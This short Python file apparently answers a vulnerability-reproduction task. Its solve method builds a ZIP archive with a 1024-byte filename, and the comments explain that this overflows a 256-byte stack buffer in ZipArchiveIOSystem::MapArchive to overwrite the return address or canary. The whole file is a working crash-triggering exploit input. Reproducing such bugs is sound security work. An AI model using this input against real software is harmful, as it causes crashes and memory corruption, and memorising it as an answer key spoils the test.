import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create an in-memory bytes buffer to store the ZIP file
        buffer = io.BytesIO()
        
        # Initialize a ZipFile object in write mode
        # ZIP_STORED is used for simplicity and to minimize processing overhead
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # The vulnerability is a stack buffer overflow in ZipArchiveIOSystem::MapArchive.
            # It allocates a 256-byte buffer for the filename and copies the zip entry name into it.
            # We generate a filename significantly larger than 256 bytes to trigger the overflow.
            # 1024 bytes is chosen to reliably overwrite the stack return address/canary.
            overflow_filename = "A" * 1024
            
            # Write a file entry into the ZIP with the malicious filename.
            # The content is minimal as the crash occurs during filename processing.
            zf.writestr(overflow_filename, b"")
            
        # Return the raw bytes of the constructed PoC ZIP file
        return buffer.getvalue()